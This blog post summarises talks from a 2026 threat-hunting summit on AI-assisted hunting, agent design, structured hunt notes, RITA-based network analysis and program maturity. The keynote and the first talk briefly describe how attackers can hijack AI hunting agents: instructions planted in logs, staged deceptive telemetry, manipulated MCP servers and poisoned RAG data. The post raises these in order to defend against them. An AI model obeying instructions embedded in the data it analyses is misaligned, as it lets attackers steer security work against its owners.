---
slug: antisyphon-training-thrunting-summit-2026-summary
title: Summary of Antisyphon Training - Threat Hunting Summit 2026 
authors: [param-jasani]

tags:
  - threat-hunting
  - thrunt
  - RITA
  - THOR-Collective
  - PEAK-threat-hunting-framework
  - MITRE-ATT&CK
  - ATHF-Framework
  - LOCK-Records
  - Legal-Landmines
  - Automated-Threat-Hunting
  - Antisyphon-Training
  - BHIS
  - AI-Red-Teaming
  - Defending-AI

date: 2026-06-28T04:00:00.000Z

description: >
  This blog is a summary of talks held at Antisyphon Training Threat Hunting Summit 2026 on 17th June 2026.
---
This blog is a summary of talks held at *Antisyphon Training - Threat Hunting Summit 2026* on 17th June 2026.

<!-- truncate -->

## Morning Keynote: "Hunters Paradox - Is It Time to Embrace Automated Threat Hunting" by David Bianco

### Introduction
This keynote session posed more brainstorming questions that would drive the community to think and tinker around and identify effective approaches to AI enabled threat hunting.

As we already know that AI attacks are on the rise, so what would happen if we as defenders use AI to our advantage?

From a threat actor's perspective, adopting AI is relatively straightforward and they use AI more aggressively as they are not concerned about collateral damage or unintended consequences, on the other hand defenders must take a far more measured and responsible approach while using AI for defense as it can inadvertently weaken an organization's security posture if not implemented properly.

### Why we can't trust AI
How the attackers/threat actors can cheat us -
- **Deceiving the AI directly** - Threat actors can embed instructions in logs/telemetry that the AI later reads during threat hunting and in turn performing a <mark>prompt injection attack</mark> on the AI model.
- **Deceiving via deception** - Attackers operate in a medium of lies. While telemetry itself may be technically accurate but threat actor might have staged benign looking activity masking malicious actions. Because AI models are bad at subtlety (adversarial deception in our case), they may misinterpret these signals and produce inaccurate assessments or reports.

### The Hunter's Paradox
Modern security environments generate terabytes of telemetry everyday. 
The sheer volume and velocity at which these telemetry gets ingested makes it difficult for humans to read and analyse it all, even large teams can't keep up with this scale. 
Modern day threat actors with the help of AI operate at machine speed, so we have to act quickly as well which can only done with the help of AI, but we can't trust it as well.

> *This is Hunter's Paradox — We can't hunt at scale without AI, but we can't fully trust the AI we need.*

### Proposing a new era of threat hunting
In 2015, organizations increasingly recognized the need for threat hunting, driven by the fear that attackers could already be present in their environments and that traditional detection systems were insufficient, but people were not sure on what it was or how to perform it, there was no single framework to define that. So to teach people threat hunting and sell their product, *Sqrrl Threat Hunting Loop* was created. Sqrrl's framework was the first published "how to" for threat hunting.
It Focused on hypothesis-driven hunting and detection improvement.
Later: *PEAK Threat Hunting Framework* (Splunk, 2023) was built on similar ideas.

Both frameworks defined threat hunting as:

> *"Any manual or machine-assisted process for identifying security incidents your automated detection systems missed."*

For many years this definition was valid as machine assited humans by accelerating investigations but at the end we needed a human to drive the hunt, but he thinks that this is coming to an end.

So if it can't be manual or machine assisted then what it should be? 
Now David proposes a new definition as Threat hunting might be…

> <mark>"Any **reasoning-driven** process for identifying security incidents your automated detection systems missed."</mark>

As today, humans are not only the ones who can reason, AI can also reason, these models are not perfect but it can do the work.
So if hunting is reason driven, then we should allow AI to drive the hunts. 

### Blueprint for Autonomous AI Hunts — The Three Pillars
Now we have to allow AI to drive the process, where should we start?
We can't just give AI so much data and tell it to hunt, we need some structure and guardrails to be really effective.

1. **Tight Focus** – AI should initially be assigned well-scoped, familiar, and highly contained hunting tasks. These are hunts with established procedures, known objectives, and clear success criteria rather than open-ended investigations requiring deep contextual understanding. A good starting point is existing hunt procedures developed by experienced threat hunters. For example, communities such as the *THOR Collective* have documented hunt procedures that provide structured workflows while still requiring some level of reasoning.
2. **Strict Guidelines** – Clear rules on what the AI can and cannot do. We can't afford to deploy AI systems without strong identity and access management (IAM) controls. AI agents should be treated much like service accounts: they need unique identities, well-defined permissions, continuous monitoring, and comprehensive audit trails. Every action they take should be attributable, traceable, and governed by clear security policies. <mark>Treat AI as a capable but inexperienced employee.</mark>
3. **Graduated Autonomy** – Begin with advisory roles with limited actions then later give more autonomy as trust builds.

### Existing AI Hunting Capabilities
- Tools and assistants already exist (e.g., David's open-source *PEAK Assistant* targets the Prepare phase: scoping and planning).
- Automation is stronger in Execute and Act phases.
- Combination of agent skills + MCP servers can go quite far.

### Recommendations Going Forward
- Reframe hunting as *reasoning-driven*.
- Three Pillars — Narrow scope + strict guidelines + graduated autonomy.
- Humans set the agenda and drive creative/strategic elements.
- Experiment as a community.
- Don't over rely on AI always keep humans in the driver's seat.

---

## Talk 1: "How Agents Solve Threat Huntings Biggest Problem" by Faan Rossouw

### Introduction
Faan picks up exactly where David's keynote left off. 
He walks on the same line of questions that David presented us in the keynote and suggests what would happen if we replace human judgement with a pattern matching agent. 
To present the problem to us, he takes help of an analogy.

### The Analogy — Spotting the deer in the forest
- You're in a forest with a radio, Faan tells you to report over the radio as soon as you see a deer.
- You spot a deer, you report it to Faan.
- You spot a *deer with a mustache*, you laugh and report the variation naturally.
- Now, Replace the human with a rigid pattern matching agent (GOF deterministic detection signature) it only sees exact "deer" and misses variants.

Now how to solve this problem? One way would be to just relax the detection criteria so that the agent spots the variation as well. But it introduces another problem, i.e. **False Positive Deluge**.

So if detection criteria is -
- Too Strict = Miss slight variations, FNs = *Brittle*
- Too Relaxed = Introduce too many FPs = *Noisy*

> *Alert based security is <mark>low resolution</mark>.*

### Why alert based security is low resolution?
So in a typical SOC environment, if we focus only on the alert part, from a machine's perspective it will be just a boolean value, i.e., it will be an alert or not one, but for us as humans there is more to it, we use initial breadcrumbs to derive a conclusion or there is some kind of chain of thoughts associated to it which drives our process to evaluate, we like to connect the dots to arrive at a conclusion, or for that matter make intuitive calls during the process, that is what human judgement is all about in threat hunting, we drive the process, we are involved in the detection itself and not just in reviewing the output.

> *The main goal of threat hunting is not just to find threats, it's main goal is to <mark>drive overall improvement in security posture</mark>, as David reframed it in the PEAK framework.*

### If threat hunting is so great, why is it still seen as a luxury?
As David also highlighted in his keynote, the detection demand is increasing but human judgement can't dramatically scale with it and match the requirements.

### So what is his core thesis? 

> *"We can dramatically scale human judgement through the <mark>intentional integration of an agentic layer</mark> in a threat hunting system."*

#### How to then do intentional integration?
Identify where you can utilize transformer based intelligence to maximize strengths of your organisations while also retaining deterministic code and human intelligence, if there is a chance of AI hallucination then stick to the basics of using the good old fashion deterministic code. So it all boils down in identifying key areas where you can boost your overall security posture and use the strengths of all three.

Keypoints - 
- Use where it presents value
- Omit where it does not present value
- Maximize strengths
- Minimize + mitigate weaknesses 

So to cover all these keypoints he proposes **9 fundamental methods** to integrate Agentic AI into existing systems.

### 9 fundamental methods for integrating Agentic AI into existing systems

#### 1. Data-Agent Interface
You cannot simply dump millions of logs into an LLM and tell it to "find evil." Agents are designed for reasoning, not raw calculation. Doing so leads to context overflow, the "lost in the middle" fallacy, high latency, and spurious correlations. To bridge this gap efficiently, defenders must use:

- **Pre-Emptive Data Analysis (Distillation):** Using traditional compute to run statistical analysis on all the telemetry and then using that probability in your hypothesis generation.

- **On-Demand Analysis & Retrieval:** Leveraging frameworks like *CodeAct* or *Roberto Rodriguez's* concepts which helps in standardizing the tooling that the AI can use, then the AI can query and analyze data dynamically, after the generation of initial hypothesis.

- **Relational Structuring (Knowledge Graphs):** KGs are a very efficient way to elucidate the relationships between different data entities, so first process your telemetry into KGs before agents deal with it.

- **Agentic Detection Engineering:** After parsing IOCs from your intel feeds, use agents to run sigma detections on your telemetry.

- **GUI / Vision Mediation (Legion)**

#### 2. Shared State
We do standard LLM interactions by sending streaming tokens via an API call to the LLM and receive streaming tokens back as an answer, even when LLM runs a tool, its a json request to run the tool, the model can't really run the tool. 
So the question arises that how do we preserve those values returned by different API calls that are running in parallel during hunts so that these values are accessible to future agents?
The answer to it is <mark>Knowledge Graphs</mark>.
Faan highlights KGs as a highly effective way to map out this shared state, especially when tracking the complex connections between different entities during a hunt.

#### 3. Tools
Hunters love their tools, and agents can be given the ability to use them either by asking the harness to perform the action or through automated workflows. Models do not execute the tools directly; the harness makes the API call on their behalf.  
- **Inline Functions:** Any inline function created in the harness can be exposed to the model.  
- **Shell Use (CLI):** Models are highly capable at CLI use due to its short, corrective feedback loop.  
- **API Calls (Cross-Process):** CLIs are a flexible and popular approach for making API calls, and the *Model Context Protocol (MCP)* can also be utilized.  
- **GUI Automation:** While classically viewed as expensive and slow, GUI automation is improving, allowing agents to learn by shadowing human interactions on the interface.  

#### 4. Orchestration
Default agent interactions often occur in a sequential manner, where a user asks a question and the model replies.  
When scalling we want to move away from this sequential pattern, how to do that?
- **Parallelization:** When scaling, independent tasks can be run in parallel to reduce latency.  
- **Maker-Checker Design:** Models can review each other's outputs, sometimes acting as an "LLM as a judge."
- **Gates:** Multiple agents can act as review gates in a workflow before critical decisions cascade and affect other areas.  

#### 5. Skills
Skills are the evolutionary progression from simple "prompts." It's where we concretize the fuzzy knowledge of organization (what lives in a hunter's head) into <mark>Standard Operating Procedures (SOPs)</mark>.

**Characteristics:** They must be *executable*, *automatable*, and *atomic* (targeting a very specific method or objective).

**Lifecycle:** Skills should be composable (combinable), version-controlled, A/B tested, and shareable with the community.

**Direction:** You cannot just tell an agent to "go find stuff." Skills provide the strict boundaries: *"Here is the telemetry, here is the specific thing you are looking for, and here are the conditional workflows and reference scripts to use."*

#### 6. Context Engineering
Everything a base model knows lives in its pre-trained weights.
There are two flaws associated with it first is that the knowledge base lags behind by few months and another is that they are inherently flawed for enterprise defense because they know absolutely nothing about your specific organization, network architecture, or crown jewels.
So to give them the context, we can use mechanisms like *RAG (Retrieval-Augmented Generation)* or *DuckDB* to inject specific organizational context right when the agent needs it.

#### 7. Feedback Loops
Introducing a skills based node that allows for intentional reflection following a hunt to give suggestions of how it can improve itself. To simplify, After a hunt another agent will look into the hunt and ask questions that what was missed during the hunt while also coming up with suggestions to improve itself.

#### 8. Evaluations
When you alter the system's architecture, prompts, or skills, you need a way to measure the impact of those changes.
Eval ensures that system improvements are driven by <mark>hard metrics and verifiable performance data</mark>, rather than just relying on "vibes" or gut feelings about the AI's output.

#### 9. Adversarial Resilience
As David mentioned in the keynote, introducing an AI agent layer inherently increases your attack surface.
Therefore the threat actors can exploit the AI via prompt injection hidden within telemetry logs, manipulated MCP servers, or poisoned RAG databases.
So we should actively guard and remediate every vector where an attacker could theoretically influence or hijack the agent's reasoning.

---

## Talk 2: "Avoiding Hunt Amnesia - Building a Memory Your AI Can Use" by Sydney Marrone

### Introduction
Sydney starts by presenting us the problem of **Hunt Amnesia**, what she simply means by that is our teams conduct a successful threat hunt and forget their own work; like 6 months or 1 year down the line, our teams are unable to remember that what queries were executed, the hypothesis or even what was the result of the hunt.
She highlights that in 2026, it's still one of the biggest things that lies between our threat hunting teams and AI augmented threat hunting.

### What price we pay when suffering from Hunt Amnesia
- Same Hypothesis, possibly hunted twice.
- Same dead end, encountered twice.
- New hunter who is onboarded has zero knowledge of previous hunts, so they are starting from zero.

> *The <mark>Knowledge</mark> part in PEAK framework is the most important that most people skip. Knowledge is connected to all parts of the hunt, so it has to be compounded at each and every step of a threat hunt.*

### Agentic Threat Hunting Framework (ATHF)
ATHF is a framework in which AI agents join us in threat hunting cycle as **collaborators**, they do not replace us, they enable us.
Now ATHF needs structured hunt notes, ATHF only works if our past hunts are readable to a human or even a model, so we need structuring, this is where **LOCK** comes in.

### LOCK format
The LOCK has four moves:
- **L**earn - Contains what our hypothesis is and what's the threat context 
- **O**bserve - Contains what does the expected normal look like or what does suspicious look like
- **C**heck - Contains our queries which were executed, their results, the analysis that was performed and conducted iterations.
- **K**eep - Contains the decisions made that were part of the hunt, lesson learned from this hunt, and what we will improve in next hunt.

These all four moves go in a single hunt file which is in markdown (`.md`) format.

#### Front Matter
The front matter is in YAML format, it contains facts like -
- When did the hunt run?
- What TTPs were executed?
- What it is linked to?
- What are the results?
- etc..

#### Body 
Below front matter we have our body, this is where our LOCK format actually comes into play, we have our LOCK headings and their subsequent information as stated above.

The above format makes it easier for AI to query it, the sections are predictable which helps our teams to stick with the structure and makes our job easier to maintain memory.

### Using AI Agents to query
Just simply provide your AI agent the above created markdown files and ask questions related to your past hunts.
Make a markdown hunt repo where you store all your previous hunts.

### Takeaways
- LOCK keeps our previous hunts in order, giving them a proper structure and in turn making it easier for our teams to look back in time while also making it easier for AI agents to query and find information about our previous hunts.
- <mark>Memory compounds over time</mark> which helps our team to gain more knowledge over time, also less reliance of new hunters over seniors.

---

## Lunch Demo: "Getting Started with Network-Based Threat Hunting" by Active Countermeasures Team

### Introduction
During the lunch break, Joe provided an introductory session on network threat hunting. The goal of this session was to help beginners collect, explore, and analyze network traffic in their home labs.

### The Shape of Network Traffic
When analyzing network traffic, packets are built in layers to encapsulate specific tasks. A simple `curl` request requires around 11 packets just to fetch an HTML page. These are the layers that matter most during threat hunting:
- **Link Layer:** Handles flow within your local network (e.g., your laptop to your router).
- **Internet Layer:** Routes your traffic across the internet (e.g., local IP and server IP).
- **Transport Layer:** Handles the conversation flow and ports (e.g., TCP handshakes and port numbers).
- **Application Layer:** Carries the actual message, which is usually encrypted (e.g., HTTP/HTTPS traffic).

Looking at raw packets (PCAPs) in Wireshark can be overwhelming due to the sheer volume of data.

### The Need for Connection Summaries

> *Threat hunters live in the <mark>abstraction layer</mark>. We don't want to stare at individual packets; we want connection summaries to build a behavioral story.*

- Summaries tell us: Timestamp, Source/Destination IPs, Ports, Duration, and Bytes Transferred.
- When combined with behavioral analysis (e.g., seeing a connection occur exactly every 20 seconds), we can hypothesize about what a device is actually doing.

### Building a Home Lab Pipeline
Joe showcased a simple, affordable pipeline for analyzing network traffic at home:

#### 1. Capture Traffic (Packet Capture)
- **Passive Collection:** Observing traffic on the side without modifying or decrypting it.
- **Local Machine:** Use `tcpdump` (Linux/Mac) or `tshark` (Windows).
- **Travel Router:** Use a cheap travel router, plug in a USB flash drive, run `tcpdump`, and connect all your devices. Let it run for 24 hours to capture your entire local network's traffic.

#### 2. Generate Zeek Logs
- **Zui (formerly Brim):** Drag and drop your `.pcap` file directly into the Zui UI, and it automatically converts it into Zeek logs.

#### 3. Behavioral Analysis with RITA
- RITA is best run in Docker.
- Import your Zeek logs into RITA to identify malicious behaviors like beacons or long connections, and export the results.

#### 4. Querying the Data (Zed Lake)
- Import your Zeek logs and RITA output into a Zed Lake (using Zui).
- Run queries to identify top talkers, longest connections, rare ports, and potential beacons.
- **Pro-tip:** Use Generative AI (like Claude) to learn the Zeek/RITA schema and write the queries for you!

---

## Talk 3: "Threat Hunting with RITA: A Behavioral Analysis of C2 Traffic" by Hermon Kidane

### Introduction
Hermon starts the talk by referring to the *Pyramid of Pain*.
As we all know, the top layer of the Pyramid of Pain is **TTPs**, as it is the most difficult IOC to change for an attacker. 
TTPs = Behaviors of a threat actor.
So tracking down these behaviors makes our threat intelligence a lot better, and this is exactly where RITA comes in.

### RITA (Real Intelligence Threat Analytics)
- It is an open-source framework for detecting command and control communication through network traffic analysis.
- The RITA framework ingests Zeek logs in TSV or JSON format, or PCAPs converted to Zeek logs for analysis.
- It is developed by *Active Countermeasures*.
- The analysis detects various behaviors:
  - Beaconing 
  - Long Connections
  - DNS Tunneling 
  - Threat Intel

### How to feed Zeek logs to RITA
#### Manual Way
- Convert the PCAP file or network capture that you have to Zeek logs.
- Then feed it to RITA.
#### For automated/continuous monitoring
- Place a Zeek network sensor.
- Feed that data to RITA.

### CLI Tools for Threat Hunting
When analyzing Zeek logs, there are a few command-line tools that come in handy:
- `zeek-cut`, `grep`, `awk`
- **Threat Hunting Toolkit:** Developed by *Ethan Robish* (BHIS). This toolkit is extremely useful as it standardizes interactions with different Zeek log formats (JSON/TSV) and provides great analysis scripts.

### Analyzing Beacons
Beacons are persistent, regular callbacks from a compromised machine (victim) to the attacker's Command and Control (C2) server.
- The victim repeatedly asks, *"Do you have any jobs for me?"*
- Often, the C2 server says *"Go back to sleep"*, but occasionally it will send instructions (e.g., run `whoami`).
- Even when attackers mix in jitter (randomized timing), the traffic maintains a <mark>recognizable, regular cadence</mark> that cannot be easily masked on the network.

### Using RITA to Hunt
Hermon demonstrated the practical steps for analyzing this traffic using RITA's CLI interface. If you're ever unsure of what to do, running `rita` by itself provides a helpful list of available commands.

1. **Importing Data:** Use `rita import --database=<database_name> --logs=<path_to_logs>` to ingest the Zeek logs.
2. **Listing Databases:** Use `rita list`
3. **Viewing Results:** Use `rita view <database_name>` to explore the analyzed data.

#### Key RITA Columns
When viewing the data, RITA provides a table sorted by severity, containing several insightful columns:
- **Severity:** RITA calculates how malicious a connection is in the backend (Critical, High, Medium, Low).
- **Source Address:** The internal host that is communicating outward.
- **Destination Address:** The external domain/IP being contacted.
- **Beacon:** The beacon score (indicating how regular and beacon-like the communication is).
- **Duration:** Helpful for spotting long, persistent connections (another common malware behavior).
- **Subdomains:** Indicates how many subdomains a top-level domain had in the logs. This is crucial for detecting <mark>DNS Tunneling</mark> (C2 over DNS).
- **Threat Intel:** Flags domains matching any configured threat intelligence feeds.

### DNS Tunneling
- **Concept:** DNS Tunneling encapsulates C2 traffic or data exfiltration within DNS queries and responses.
- Attackers use randomly generated subdomains to bypass perimeter defenses since DNS traffic is rarely blocked.
- RITA detects this by analyzing the sheer volume of unique subdomains queried for a specific top-level domain.
- A high subdomain count (e.g., thousands of queries to `*.malicious.com`) is a strong indicator of DNS tunneling.

### Threat Modifiers & Correlation
- RITA's extracted logs and signatures can be correlated with external Threat Intelligence platforms to level up your hunting.
- By looking at specific threat modifiers, you can spot anomalies that stand out against known malicious patterns:
  - **Prevalence:** Frequency of occurrence.
  - **First Seen:** Identifying if a beacon is brand new vs. something seen 6 months ago.
  - **Rare Signatures:** Looking for unusual JA3 hashes or User-Agent strings.
  - **URI Mismatch.**

### Network Threat Hunting to Find Security Gaps
Threat hunting doesn't always yield a malicious C2 server; in fact, most connections are benign. However, network hunting is incredibly valuable for identifying security gaps, maintaining inventory, and baselining.

**Finding Poor Security Configs:**
- Spotting cleartext passwords or unencrypted sensitive information.
- Identifying IoT devices calling out to weird update servers.
- Detecting internal scanning or probes.
- Misconfigurations like Kerberos or SMB traffic being sent out to a public address (once identified, we can harden our systems!).
- Performance issues caused by configs making every internal host send wrong service packets outbound.

**Inventory & Shadow IT:**
- Network hunting can uncover Shadow IT, such as RMM (Remote Monitoring & Management) tools running that you never use in your org.
- The network is a great way to build your hardware and software inventory.
- It provides visibility into IoT, embedded systems, and other network devices that might not even support EDR agents.

### General Takeaways
- Network threat hunting is about finding <mark>anomalies in behaviors</mark>, not just relying on static signatures.
- Tools like RITA simplify this by abstracting raw packets into actionable connection summaries.
- Regularly reviewing RITA's output helps build a baseline of "normal" for your network, making malicious behavior and security gaps stand out faster.

---

## Talk 4: "Threat Hunting in the Dark: A Practical Approach" by Shane Hartman

### Why "Finding BAD" Doesn't Work
#### The Missing Context and Focus

Many organizations start their threat hunting programs with the vague objective of "finding bad," as the managers are not technical and don't know how to put this up, so the threat hunters have questions in mind like - 

- What does finding "bad" actually mean?
- Are you trying to find an active attacker, confirm an existing breach, or just identify employees behaving badly?

It also lacks focus, leaving teams unsure if they should concentrate their attention on infrastructure, the perimeter, services, or the cloud.

- Finally, it fails to define success; if we find bad, is that now considered an incident?

### The "No-Win" Situation

Hartman points out that building a program solely to look for "bad" creates a literal <mark>"no-win situation"</mark> for the security team:

- **If you do find bad:** You now have an active incident on your hands. The organization has to immediately address the situation, which requires time, resources, and often causes business disruption.
- **If you don't find bad:** You are left empty-handed when asked to prove the value of your time. Simply showing your manager a list of cool technical queries you ran does not demonstrate Return on Investment (ROI) or justify the hunting program's ongoing budget.

### Where Do You Start?
#### Types of Threat Hunts

Threat hunting is primarily a proactive activity used to identify threats that may have evaded detection. However, hunts can take several different forms:

- **Reactive:** Acting upon specific information, such as Threat Intel or Indicators of Compromise (IoCs).
- **Telemetry / Posture:** Hunts based on the environment itself, often referred to as *"watching the watchers"*.
- **Proactive:** Hypothesis-driven hunts exploring "what if" scenarios and how an attack would function.
- **Retro-Hunts:** The process of repeating a previous hunt.
- You can also use a Threat Hunting framework.

> *The ultimate goal of threat hunting is to <mark>improve the overall security posture</mark> of the organization.*

### The Threat Hunting Maturity Model: Where Are You?

Before diving into specific telemetry or posture hunts, it helps to understand your current operational level. Referencing a framework created by *David Bianco*, Hartman outlines five tiers of threat hunting maturity:  

- **Tier 0 (Initial):** Relies primarily on automated alerting. There is little or no routine data collection.  
- **Tier 1 (Minimal):** Incorporates threat intelligence IOC searches. Features a moderate to high level of data collection.  
- **Tier 2 (Procedural):** Follows analysis procedures created by others. Maintains high or very high data collection.  
- **Tier 3 (Innovative):** Creates new data analysis procedures. High or very high data collection. At this stage, teams are producing real, actionable analysis.  
- **Tier 4 (Leading):** Automates the majority of successful analysis procedures.  

Hartman noted that most organizations are currently sitting in tiers 0, 1, or 2, or a hybrid of those levels. In these early stages, teams might merely use EDR to pick up IOCs or centralize logs without actively reviewing them unless an alert triggers. They lack a formalized structure.  

The goal is to transition out of the initial procedural stages and into the *"Innovative"* and *"Leading"* tiers. Reaching this maturity allows threat hunting to become automated and highly useful to other departments, such as the SOC, Red Team, Detection Engineering, and Cyber Threat Intelligence (CTI). For example, if CTI reports a new vulnerability, a leading program can simply qualify that they have already searched for and mitigated the issue, rather than having to spin up a reactionary, ad-hoc threat hunt.  

### Telemetry and Posture Hunting

These hunts start out with a foundational question: <mark>"How do we know what we know?"</mark>. IT might assure us that EDR is fully deployed, all assets are known, and subnets are documented. We might believe we know what our cloud environments look like and that our logs are perfectly centralized. However, asking the question might reveal that Linux or Mac logs are missing entirely. If you don't ask the question, you will never realize there is a gap you cannot see into.  

You must also ensure coverage across perimeters, firewalls, and third-party VPNs, as you never know where a threat group might pivot. You need to have the telemetry data first before you can actually hunt for threats.  

The most practical approach is to assume there are gaps and actively hunt for them to validate these claims. A critical outcome of finding a gap is feeding that information back into the threat hunt process to answer what might not have been seen while the gap was in place.  

#### How Do I Know I Have Full EDR Coverage?

A practical example of "watching the watchers" is verifying your EDR deployment. Hartman provided a mathematical breakdown for this simple telemetry hunt:  

- Get the number of end points covered – `X` .  
- Query inventory system (a control system based on process) – `Y1`.  
- Query Active directory (an authentication system) – `Y2`.  
- Query IP Space in Use (the physical network space) – `Y3`.  
- Remove non-endpoint compliant devices – ie. Routers.  
- `(X - Y1)` – Diff in Inventory system.  
- `(X - Y2)` – Diff in AD.  
- `(X - Y3)` – Diff in IP Space.  

Any discrepancies reveal clear gaps in telemetry. When you work to close these gaps and bring the numbers closer to zero, this gap closure can be reported to leadership as a <mark>reduction in exposure</mark>.  

#### Other Questions / Hunts

There are numerous other simple questions you can ask to confirm the correct data is collected:  

- **Network Space:** How much of your static IP space is occupied? This is where your server or core infrastructure often lives. Would you know if a new system showed up or if one was decommissioned?  
- **Log Review:** Do you collect PowerShell logs? If so, what kind of information can you garner from them? Can you review and hunt DNS Logs?  
- **Software Inventory:** How many versions of Java are in the environment? Do you have Remote Management (RMM) tools like TeamViewer or ScreenConnect that attackers leverage to get into networks?  
- **Account Management:** Are service accounts staying within the designated areas? Do you even have an inventory of service accounts to know where they are supposed to be?  

#### Focusing on the Crown Jewels

A significant portion of your hunting emphasis should lie with the organization's **"Crown Jewels"**. Identifying these assets relies on asset management, Business Impact Analysis, Business Continuity Plans, and Disaster Recovery procedures. These critical assets could include employee and client information, HR data, proprietary information, and core web applications. Hunters need to define the specific threats targeting these assets, understand what would happen if they were compromised, and develop hunts to address these specific hypotheses.

### Proactive Threat Hunting Approaches

When shifting into proactive hunting, there are four primary methodologies you can leverage:

- **Hypothesis Driven:** Grounded in organizational reality, this involves identifying the most likely attack vectors for your specific industry and mapping them back to MITRE ATT&CK techniques (e.g., hunting for persistence via scheduled tasks under T1053).
- **Intelligence Driven:** This relies on details gathered from news feeds, articles, and intelligence sources. Hunters must determine if the intelligence is relevant to their organization, gather the TTPs, IoCs, and IOAs, and then build the hunt.
- **Anomaly-Based:** Looking for deviations from normal baselines that may or may not appear as statistics. Examples include users running LOLBins, executing large outbound data transfers, or attempting privileged cloud API calls.
- **Analytics Driven:** Driven primarily by statistical data and machine learning patterns. Examples include spotting DNS tunneling, long-lived cloud credential creation, or the use of limited/unusual protocols.

### Securing the Bag: Executive Buy-In
#### Translating Tech to Business Value

A crucial realization for the longevity of any hunting program is that <mark>executives do not fund "cool technical queries"</mark>.

- They are interested in funding **risk reduction**, **cost avoidance**, **operational resilience**, and **board/shareholder equity**.
- Conversely, they want to avoid reputational damage, liability exposure, regulatory/compliance violations, and business disruption.

To secure buy-in, you must speak their language and translate technical findings into tangible business value:

- **The Risk Reduction Frame:** Move away from saying *"We searched for T1078."* Instead, explain that you verified and closed detection blind spots across 40% of the cloud credential access techniques used by active threat groups this quarter.
- **The Cost Avoidance Frame:** Highlight that the global average cost of a data breach sits north of **$4.4M**, with an average containment lifecycle of **200+ days**. Show how proactive hunting directly shrinks the Mean Time to Detect (MTTD), catching the attacker before lateral movement and ransomware deployment.

### Metrics Leadership Actually Cares About

- **Mean Time to Detect (MTTD)**
- **Mean Time to Respond (MTTR)**
- **False Positive Reduction:** Showing how hunt findings are refined to reduce noise, creating analyst capacity back for the SOC.
- **ATT&CK Coverage Delta:** The percentage increase in validated detection coverage over time.
- **Data Source Health:** The identification of blind spots before an incident actually occurs.

### Common Pitfalls and Key Takeaways
#### Pitfalls to Avoid

- Executing generic or simple hunts that don't reflect your actual threat landscape or are already primarily covered by EDR alerting.
- Missing key stakeholders with interest and buy-in.
- Failing to mature the program over time.
- Over-relying strictly on IoCs and ignoring operational baselines or environmental context.
- Treating hunts as one-time events rather than an ongoing program.
- As noted in the presentation, a poorly executed threat hunt becomes a checkbox exercise where nothing is gained, and nothing is learned.

#### Key Takeaways

- Ground every single scenario in your real threat landscape.
- Define SMART objectives before developing a hunt.
- The overarching goal is to elevate the security posture and awareness.
- Keep track of your hunts and meticulously document the output.
- Always be looking for ways to automate and mature the program.
- Remember the core management principle: <mark>The overarching goal is to improve your security posture, not chase unicorns.</mark>

---

## Talk 5: "Fast-track Reports into Ready-Made Hypotheses with AI" by Lauren Proehl

### Introduction
The talk focuses on the challenge of converting Threat Intelligence (TI) reports into actionable hypotheses. The core problem is that many TI reports just sit in email inboxes or Slack channels due to sheer volume and lack of prioritization. Lauren emphasizes *"intel-driven hunting,"* comparing it to a bank in Chicago that shouldn't hunt for malware targeting North Korean grocery stores. Threat hunters need to extract behaviors and connect the dots to create testable hypotheses, which is the first step toward using AI effectively.

### The 4-Part Contract (The Steps)
Lauren created a contract to ensure that an intelligence report becomes a structured and testable hypothesis, not just a summary or a list of IOCs. <mark>If the model can't fill all details, the hunt doesn't exist</mark> and needs more work. The process includes four non-negotiable steps for every report:

#### Step 1: Extract Tradecraft, Drop the Noise
The first step focuses on pulling out behaviors and sequences while dropping volatile indicators. 
- **Keep:** Process lineage & command-line patterns, persistence, C2, lateral movement, cred access, discovery, evasion, impact. Every variant (e.g., 3 C2 transports = 3 hunts).
- **Drop:** Hashes and single-use file names, rotating TryCloudflare subdomains, decoy domains, and anything that changes in the next intrusion (unless relevant to behavior context, like exfiltration to Google Drive).

> **The Prompt That Does It:**
> *"From the report below, extract EVERY distinct behavior across the whole intrusion: process lineage, LOLBins, persistence, C2 technique, lateral movement, cred access, discovery, defense evasion, impact. List each variant — don't collapse them. IGNORE hashes, IPs, and single-use domains. Tag each with its kill-chain phase and the actual command / path. End with a count so nothing drops downstream."*

#### Step 2: Map to ATT&CK, Then Check the Model's Work
AI models often hallucinate or use stale training data, so mapping behaviors correctly is critical.
- **Where the model lies:** It invents technique IDs that look right but don't exist, picks parent techniques instead of specific sub-techniques, and maps the tool rather than the behavior.
- **Solution:** Always diff against the live matrix. The prompt uses an MCP (Model Context Protocol) to query the live MITRE ATT&CK matrix to validate IDs. If it cannot verify, the model must flag it with `[VERIFY]` for human review.

#### Step 3: A Hunt is Only Real if You Can Run It
You must define the exact data sources and event IDs required for the hunt. <mark>If the telemetry doesn't exist, that itself is a finding</mark> (a coverage gap). 
- **Data Sources to specify:**
  - **Process / EDR:** DeviceProcessEvents, ImageLoad, Sysmon 1/7, Sec 4688.
  - **Network Egress:** DeviceNetworkEvents, DNS / Sysmon 22, proxy + TLS SNI.
  - **Identity / AD:** Sec 4769 / 4624 / 5136, Sentinel SecurityEvent (DC).
  - **Cloud Audit:** DeviceProcessEvents (rclone) - 7045 - egress proxy / SWG.
- The AI should output analytic logic (like KQL, SPL, or Sigma) based on publicly available documentation to give hunters a starting point. 

> *Hearth automatically filters hypotheses based on your available data sources so coverage gaps are obvious before starting.*

#### Step 4: The Output — A Hunt Card
The final output is a repeatable shape for every hypothesis that scales from a solo hunter's notebook to a program's backlog. It includes six components:
1. **Hypothesis:** One sentence describing the behavior you expect to find.
2. **ATT&CK:** Verified Technique ID and name.
3. **Data Source:** Named tables & Event IDs (never just "EDR").
4. **Analytic Logic:** A real, runnable query (e.g., KQL, SPL, Sigma).
5. **Validation:** Expected hits and known false positives to baseline.
6. **PEAK Category:** Hypothesis-driven, Baseline, or Model-assisted.

### Prompt Crafting
What turns a basic summary into a runnable hypothesis? Lauren shared these prompt engineering pointers:
- **Frame the role:** Explicitly tell the AI it's a *"Senior hunter, not a chatbot."* This changes the quality of the output.
- **Cover it all:** Instruct it to extract *every* behavior and variant, not just the flashy ones.
- **Real fields only:** Demand named tables and Event IDs, explicitly stating *"no invented operators."*
- **Validate always:** Ensure expected hits and false positives are baselined.
- **Ban indicators:** Reject answers that are just <mark>"IOCs in a trench coat."</mark>

> **The System Prompt:**
> *"You are a senior threat hunter, not a chatbot. You turn threat reports into hunts a hunter can run today — rigorous and skeptical of your own output.*
> *Rules you never break:*
> *- Hunt BEHAVIOR, not indicators.*
> *- Map to ATT&CK by behavior; use the most specific sub-technique. Unsure an ID exists? Say so — never invent one.*
> *- Ground every query ONLY in that hunt's named data source.*
> *- Every hypothesis ships with validation: expected hits AND the false positives to baseline.*
